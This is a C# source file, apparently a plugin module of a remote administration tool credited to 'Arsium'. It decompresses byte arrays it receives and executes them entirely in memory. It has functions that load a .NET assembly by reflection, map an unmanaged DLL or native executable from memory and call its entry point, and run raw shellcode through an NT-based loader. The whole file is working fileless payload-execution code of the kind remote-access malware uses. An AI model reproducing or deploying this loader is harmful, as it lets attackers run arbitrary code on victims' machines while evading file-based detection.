using Microsoft.VisualBasic;
using System;
using System.Threading.Tasks;
using static Shared.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class Functions
    {
        internal static ReturnHelper ExecuteManaged(ref byte[] Dll, string etp) 
        {
            try
            {
                string[] s = Strings.Split(etp, ".");
                System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(Shared.Compressor.QuickLZ.Decompress(Dll));
                System.Reflection.MethodInfo method = null;
                method = assemblytoload.GetType(s[0] + "." + s[1]).GetMethod(s[2]);
                object obj = assemblytoload.CreateInstance(method.Name);

                Task.Run(() => method.Invoke(obj, new object[] {}));

                return new ReturnHelper(false, null);

            }
            catch (Exception ex)
            {
                return new ReturnHelper(true, ex.ToString());
            }     
        
        }
        internal static ReturnHelper ExecuteUnmanaged(byte[] Dll)
        {
            try
            {
                Task.Run(() => {

                    DLLFromMemory dll = new DLLFromMemory(Shared.Compressor.QuickLZ.Decompress(Dll));
                    dll.Dispose();

                });
                return new ReturnHelper(false, null);
            }
            catch (Exception ex)
            {
                return new ReturnHelper(true, ex.ToString());
            }
        }

        internal static ReturnHelper ExecuteNativePE(byte[] Exe)
        {
            try
            {
                Task.Run(() => {

                    DLLFromMemory exe = new DLLFromMemory(Shared.Compressor.QuickLZ.Decompress(Exe));
                    exe.MemoryCallEntryPoint();
                    exe.Dispose();

                });
                return new ReturnHelper(false, null);
            }
            catch (Exception ex)
            {
                return new ReturnHelper(true, ex.ToString());
            }
        }

        internal static ReturnHelper ExecuteShellCode(byte[] ShellCode) 
        {
            try
            {
                ShellCodeLoader Load = new ShellCodeLoader(Shared.Compressor.QuickLZ.Decompress(ShellCode));
                Load.Asynchronous = true;
                Load.LoadWithNT();
                //Task.Run(() => Load.LoadWithNT());
                return new ReturnHelper(false, null);

            }
            catch (Exception ex)
            {
                return new ReturnHelper(true, ex.ToString());
            }
        }
    }
}
